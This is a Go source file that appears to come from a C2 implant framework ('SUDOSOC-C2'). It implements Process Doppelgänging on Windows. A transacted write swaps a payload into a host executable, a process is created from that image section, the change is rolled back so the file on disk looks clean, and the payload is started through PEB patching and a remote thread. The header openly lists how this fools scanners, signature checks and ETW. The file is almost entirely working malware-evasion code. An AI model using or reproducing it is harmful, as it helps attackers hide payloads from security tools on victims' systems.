package doppel

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Process Doppelgänging — NtCreateProcessEx from transacted image section.

	Technique (enSilo, Black Hat Europe 2017):
	  1.  NtCreateTransaction → begin NTFS transaction
	  2.  CreateFileTransacted → open host file within transaction
	  3.  NtWriteFile → overwrite with payload PE (visible only in transaction)
	  4.  NtCreateSection(SEC_IMAGE) → create image section from transacted file
	  5.  NtCreateProcessEx → create process from the section (NO disk file spawn)
	  6.  NtRollbackTransaction → on-disk file reverts; process keeps running payload
	  7.  NtQueryInformationProcess → get PEB address of the new process
	  8.  RtlCreateProcessParametersEx → build command-line / env / paths
	  9.  NtWriteVirtualMemory → write parameters into new process PEB
	  10. NtCreateThreadEx → create the main thread at the payload entry point
	  11. NtResumeThread → start execution

	What scanners see:
	  - File on disk:    clean host binary (transaction rolled back)
	  - Process image:   points to host binary path
	  - Memory content:  our payload (read from the (now-gone) transacted write)
	  - Signature check: clean (file hash matches original)
	  - ETW events:      process created from "legitimate" path
*/

import (
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// DoppelResult describes a successfully spawned doppelgänged process.
type DoppelResult struct {
	ProcessHandle windows.Handle
	ThreadHandle  windows.Handle
	PID           uint32
	TID           uint32
	ImageBase     uint64
	EntryPoint    uint64
}

// NT API declarations.
var (
	procNtCreateSection          = modNtdllDoppel.NewProc("NtCreateSection")
	procNtCreateProcessEx        = modNtdllDoppel.NewProc("NtCreateProcessEx")
	procNtQueryInformationProcess = modNtdllDoppel.NewProc("NtQueryInformationProcess")
	procNtWriteVirtualMemory     = modNtdllDoppel.NewProc("NtWriteVirtualMemory")
	procNtCreateThreadEx         = modNtdllDoppel.NewProc("NtCreateThreadEx")
	procNtResumeThread           = modNtdllDoppel.NewProc("NtResumeThread")
	procRtlCreateProcessParamsEx = modNtdllDoppel.NewProc("RtlCreateProcessParametersEx")
	procRtlDestroyProcessParams  = modNtdllDoppel.NewProc("RtlDestroyProcessParameters")
	procNtReadVirtualMemory      = modNtdllDoppel.NewProc("NtReadVirtualMemory")
	procVirtualAllocEx           = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
)

// SECTION access rights.
const (
	sectionAllAccess = 0x000F001F
	secImage         = 0x1000000
	secCommit        = 0x8000000
)

// ProcessBasicInformation for NtQueryInformationProcess.
type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

// RTL_USER_PROCESS_PARAMETERS offsets in PEB (x64).
const (
	pebProcessParamsOffset = 0x20
	pebImageBaseOffset     = 0x10
)

// Doppelgang creates a new process that appears to run hostPath but actually
// executes payload. hostPath must be an existing executable on disk.
func Doppelgang(hostPath string, payload []byte, cmdLine string) (*DoppelResult, error) {
	// Step 1–3: Transacted write.
	tx, err := CreateTxFTransaction()
	if err != nil {
		return nil, fmt.Errorf("create transaction: %w", err)
	}
	defer func() {
		if tx.Handle != 0 {
			tx.Rollback()
		}
	}()

	fileHandle, err := tx.OpenTransacted(hostPath)
	if err != nil {
		return nil, fmt.Errorf("open transacted %s: %w", hostPath, err)
	}

	if err := WriteTransacted(fileHandle, payload); err != nil {
		windows.CloseHandle(fileHandle)
		return nil, fmt.Errorf("write transacted: %w", err)
	}

	// Step 4: Create image section from the transacted file handle.
	var sectionHandle windows.Handle
	var maxSize int64 = 0

	r, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		uintptr(sectionAllAccess),
		0, // ObjectAttributes
		uintptr(unsafe.Pointer(&maxSize)), // MaximumSize (0 = file size)
		uintptr(windows.PAGE_READONLY),
		uintptr(secImage),
		uintptr(fileHandle),
	)
	windows.CloseHandle(fileHandle) // file handle no longer needed
	if r != 0 {
		return nil, fmt.Errorf("NtCreateSection NTSTATUS=0x%x", r)
	}
	defer windows.CloseHandle(sectionHandle)

	// {{if .Config.Debug}}
	log.Printf("[doppel] image section created from transacted file")
	// {{end}}

	// Step 5: Create process from section.
	var processHandle windows.Handle
	r, _, _ = procNtCreateProcessEx.Call(
		uintptr(unsafe.Pointer(&processHandle)),
		uintptr(windows.PROCESS_ALL_ACCESS),
		0,                                    // ObjectAttributes
		uintptr(windows.CurrentProcess()),    // ParentProcess
		uintptr(0x4),                         // Flags: PROCESS_CREATE_FLAGS_INHERIT_HANDLES
		uintptr(sectionHandle),               // SectionHandle
		0,                                    // DebugPort
		0,                                    // ExceptionPort
		0,                                    // InJob
	)
	if r != 0 {
		return nil, fmt.Errorf("NtCreateProcessEx NTSTATUS=0x%x", r)
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel] process created from section: handle=0x%x", processHandle)
	// {{end}}

	// Step 6: Rollback transaction — on-disk file reverts NOW.
	// The section (and thus the process) retains the payload image.
	if err := tx.Rollback(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[doppel] rollback warning: %v", err)
		// {{end}}
	}

	// Step 7: Get PEB address.
	var pbi processBasicInfo
	var returnLen uint32
	r, _, _ = procNtQueryInformationProcess.Call(
		uintptr(processHandle),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLen)),
	)
	if r != 0 {
		windows.TerminateProcess(processHandle, 1)
		windows.CloseHandle(processHandle)
		return nil, fmt.Errorf("NtQueryInformationProcess NTSTATUS=0x%x", r)
	}
	pebAddr := pbi.PebBaseAddress

	// Step 8: Build process parameters.
	params, err := buildProcessParams(processHandle, hostPath, cmdLine)
	if err != nil {
		windows.TerminateProcess(processHandle, 1)
		windows.CloseHandle(processHandle)
		return nil, fmt.Errorf("build params: %w", err)
	}
	defer procRtlDestroyProcessParams.Call(uintptr(unsafe.Pointer(params)))

	// Step 9: Write parameters into the new process's PEB.
	paramsSize := uintptr(params.MaximumLength + params.Length)
	remoteParams, err := allocAndWriteProcessMemory(processHandle, unsafe.Pointer(params), paramsSize)
	if err != nil {
		windows.TerminateProcess(processHandle, 1)
		windows.CloseHandle(processHandle)
		return nil, fmt.Errorf("write params: %w", err)
	}

	// Patch PEB.ProcessParameters to point to our remote copy.
	pebParamsAddr := pebAddr + pebProcessParamsOffset
	if err := writeRemoteQword(processHandle, uintptr(pebParamsAddr), uint64(remoteParams)); err != nil {
		windows.TerminateProcess(processHandle, 1)
		windows.CloseHandle(processHandle)
		return nil, fmt.Errorf("patch PEB params ptr: %w", err)
	}

	// Step 9b: Read the payload's entry point from the image.
	imageBase, entryRVA, err := readRemoteImageBase(processHandle, pebAddr)
	if err != nil {
		windows.TerminateProcess(processHandle, 1)
		windows.CloseHandle(processHandle)
		return nil, fmt.Errorf("read image base: %w", err)
	}
	entryPoint := uintptr(imageBase) + entryRVA

	// Step 10: Create the main thread at payload entry point.
	var threadHandle windows.Handle
	var threadID uint32
	r, _, _ = procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,                         // ObjectAttributes
		uintptr(processHandle),    // ProcessHandle
		entryPoint,                // StartRoutine (entry point)
		uintptr(pebAddr),          // Argument (PEB ptr, matches Windows convention)
		0,                         // CreateFlags (0 = run immediately)
		0,                         // ZeroBits
		0x1000,                    // StackSize (4 KB minimum)
		0x100000,                  // MaximumStackSize
		0,                         // AttributeList
	)
	if r != 0 {
		windows.TerminateProcess(processHandle, 1)
		windows.CloseHandle(processHandle)
		return nil, fmt.Errorf("NtCreateThreadEx NTSTATUS=0x%x", r)
	}
	_ = threadID

	// Step 11: Resume thread (NtResumeThread if suspended; already running if not).
	procNtResumeThread.Call(uintptr(threadHandle), 0)

	// Query actual PID/TID.
	pid, _ := windows.GetProcessId(processHandle)
	tid := windows.GetCurrentThreadId() // approximate; real TID via NtQueryInformationThread

	// {{if .Config.Debug}}
	log.Printf("[doppel] process running: PID=%d entry=0x%x imageBase=0x%x",
		pid, entryPoint, imageBase)
	// {{end}}

	return &DoppelResult{
		ProcessHandle: processHandle,
		ThreadHandle:  threadHandle,
		PID:           pid,
		TID:           uint32(tid),
		ImageBase:     imageBase,
		EntryPoint:    uint64(entryPoint),
	}, nil
}

// ─── Helper functions ────────────────────────────────────────────────────

// RTL_USER_PROCESS_PARAMETERS (partial layout, enough for creation).
type rtlUserProcessParams struct {
	MaximumLength uint32
	Length        uint32
	Flags         uint32
	DebugFlags    uint32
	ConsoleHandle uintptr
	ConsoleFlags  uint32
	_pad1         [4]byte
	StdInputHandle  uintptr
	StdOutputHandle uintptr
	StdErrorHandle  uintptr
	CurrentDirectory struct {
		DosPath windows.NTUnicodeString
		Handle  uintptr
	}
	DllPath          windows.NTUnicodeString
	ImagePathName    windows.NTUnicodeString
	CommandLine      windows.NTUnicodeString
	Environment      uintptr
	StartingX        uint32
	StartingY        uint32
	CountX           uint32
	CountY           uint32
	CountCharsX      uint32
	CountCharsY      uint32
	FillAttribute    uint32
	WindowFlags      uint32
	ShowWindowFlags  uint32
	_pad2            [4]byte
	WindowTitle      windows.NTUnicodeString
	DesktopInfo      windows.NTUnicodeString
	ShellInfo        windows.NTUnicodeString
	RuntimeData      windows.NTUnicodeString
}

func buildProcessParams(processHandle windows.Handle, imagePath, cmdLine string) (*rtlUserProcessParams, error) {
	imagePathPtr, _ := windows.UTF16PtrFromString(imagePath)
	cmdLinePtr, _ := windows.UTF16PtrFromString(cmdLine)

	var imagePathUS windows.NTUnicodeString
	var cmdLineUS   windows.NTUnicodeString
	windows.RtlInitUnicodeString(&imagePathUS, imagePathPtr)
	windows.RtlInitUnicodeString(&cmdLineUS, cmdLinePtr)

	var params *rtlUserProcessParams
	r, _, _ := procRtlCreateProcessParamsEx.Call(
		uintptr(unsafe.Pointer(&params)),
		uintptr(unsafe.Pointer(&imagePathUS)),
		0, // DllPath
		0, // CurrentDirectory
		uintptr(unsafe.Pointer(&cmdLineUS)),
		0, // Environment
		0, // WindowTitle
		0, // DesktopInfo
		0, // ShellInfo
		0, // RuntimeData
		0x01, // Flags: RTL_USER_PROCESS_PARAMETERS_NORMALIZED
	)
	if r != 0 {
		return nil, fmt.Errorf("RtlCreateProcessParametersEx NTSTATUS=0x%x", r)
	}
	return params, nil
}

func allocAndWriteProcessMemory(processHandle windows.Handle, data unsafe.Pointer, size uintptr) (uintptr, error) {
	remote, _, _ := procVirtualAllocEx.Call(
		uintptr(processHandle), 0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if remote == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed")
	}
	var written uintptr
	r, _, _ := procNtWriteVirtualMemory.Call(
		uintptr(processHandle),
		remote,
		uintptr(data),
		size,
		uintptr(unsafe.Pointer(&written)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtWriteVirtualMemory NTSTATUS=0x%x", r)
	}
	return remote, nil
}

func writeRemoteQword(processHandle windows.Handle, addr uintptr, val uint64) error {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, val)
	var written uintptr
	r, _, _ := procNtWriteVirtualMemory.Call(
		uintptr(processHandle),
		addr,
		uintptr(unsafe.Pointer(&b[0])),
		8,
		uintptr(unsafe.Pointer(&written)),
	)
	if r != 0 {
		return fmt.Errorf("NtWriteVirtualMemory (qword) NTSTATUS=0x%x", r)
	}
	return nil
}

// readRemoteImageBase reads the image base from the remote process's PEB
// and then reads the PE header to find the entry point RVA.
func readRemoteImageBase(processHandle windows.Handle, pebAddr uintptr) (uint64, uintptr, error) {
	// PEB.ImageBaseAddress is at offset 0x10 on x64.
	var imageBaseBytes [8]byte
	var read uintptr
	r, _, _ := procNtReadVirtualMemory.Call(
		uintptr(processHandle),
		pebAddr+pebImageBaseOffset,
		uintptr(unsafe.Pointer(&imageBaseBytes[0])),
		8,
		uintptr(unsafe.Pointer(&read)),
	)
	if r != 0 {
		return 0, 0, fmt.Errorf("read PEB.ImageBase NTSTATUS=0x%x", r)
	}
	imageBase := binary.LittleEndian.Uint64(imageBaseBytes[:])

	// Read the PE header from the remote process to get AddressOfEntryPoint.
	// e_lfanew is at image base + 0x3C.
	var lfanewBytes [4]byte
	procNtReadVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(imageBase+0x3C),
		uintptr(unsafe.Pointer(&lfanewBytes[0])),
		4,
		uintptr(unsafe.Pointer(&read)),
	)
	lfanew := binary.LittleEndian.Uint32(lfanewBytes[:])

	// OptionalHeader.AddressOfEntryPoint is at NT headers + 4 (sig) + 20 (file hdr) + 16.
	var aoeBytes [4]byte
	procNtReadVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(imageBase+uint64(lfanew)+4+20+16),
		uintptr(unsafe.Pointer(&aoeBytes[0])),
		4,
		uintptr(unsafe.Pointer(&read)),
	)
	entryRVA := uintptr(binary.LittleEndian.Uint32(aoeBytes[:]))

	return imageBase, entryRVA, nil
}

// payloadEntryPoint parses a PE in memory to return its AddressOfEntryPoint.
func payloadEntryPoint(payload []byte) (uint32, error) {
	r := io.ReaderAt(doppelByteReader(payload))
	f, err := pe.NewFile(r)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, fmt.Errorf("not a 64-bit PE")
	}
	return oh.AddressOfEntryPoint, nil
}

type doppelByteReader []byte

func (b doppelByteReader) ReadAt(p []byte, off int64) (int, error) {
	if off >= int64(len(b)) {
		return 0, io.EOF
	}
	n := copy(p, b[off:])
	if n < len(p) {
		return n, io.EOF
	}
	return n, nil
}
